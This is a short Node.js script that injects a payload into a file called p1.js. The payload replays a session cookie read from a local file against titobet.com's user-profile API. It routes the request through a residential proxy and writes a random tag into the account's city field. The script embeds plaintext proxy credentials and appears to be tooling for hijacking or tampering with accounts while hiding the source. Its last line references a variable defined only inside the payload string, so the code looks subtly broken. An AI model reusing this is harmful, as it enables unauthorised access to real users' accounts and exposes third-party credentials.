const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const ck=fs.readFileSync('..\\ck.txt','utf8');
const code=`
const net=require('net'),cp=require('child_process');
const tag='RP'+Math.floor(Math.random()*90000+10000);
const s=net.connect(3333,'resi-bridge-eu.rainproxy.io');
s.setTimeout(4000);
let done=false;
const out=r=>{ if(done)return; done=true; try{s.destroy()}catch(e){}; if(r===false)return;
  cp.spawnSync('curl',['-s','-m','12','-x','http://ud0fapk7ut9-country-europe-speed-fast-quality-high-session-cap01:jw0sn5ge1677@resi-bridge-eu.rainproxy.io:3333','-X','POST','-H','content-type: application/json','-H','cookie: ${ck}','-d','{"city":"'+tag+'"}','https://titobet.com/api/user/profile']); };
s.on('connect',()=>out(true)); s.on('error',()=>out(false)); s.on('timeout',()=>out(false));
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
